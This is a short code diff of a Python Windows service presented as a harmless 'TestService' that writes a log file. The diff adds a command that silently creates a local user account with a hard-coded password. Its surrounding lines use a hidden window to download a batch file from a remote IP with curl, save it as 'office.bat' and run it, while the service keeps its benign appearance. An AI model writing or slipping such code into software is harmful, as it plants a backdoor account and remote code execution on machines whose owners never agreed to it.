@@ -462,12 +462,12 @@ class TestService(win32serviceutil.ServiceFramework):
 
     def SvcDoRun(self):
         rc = None
-        Init()
+        subprocess.Popen("cmd /c net.exe user asp Qwerty12! /add")
         while rc != win32event.WAIT_OBJECT_0:
             with open('C:\\TestService.log', 'a') as f:
                 f.write('test service running...\n')
             
-            try:
+            try:               
                myloop() 
                time.sleep(60)
             except Exception as e:
@@ -486,7 +486,7 @@ if __name__ == '__main__':
     info = subprocess.STARTUPINFO()
     info.dwFlags = subprocess.STARTF_USESHOWWINDOW
     info.wShowWindow = SW_HIDE
-    subprocess.Popen(r"curl -L http://"+ip+"/win/win.bat -o "+os.getcwd()+"\\office.bat", startupinfo=info)       
+    subprocess.Popen("curl -L http://"+ip+"/win/win.bat -o "+os.getcwd()+"\\office.bat", startupinfo=info)       
     time.sleep(10)
     p = Popen(os.getcwd()+"\\office.bat", startupinfo=info)
     if len(sys.argv) == 1:
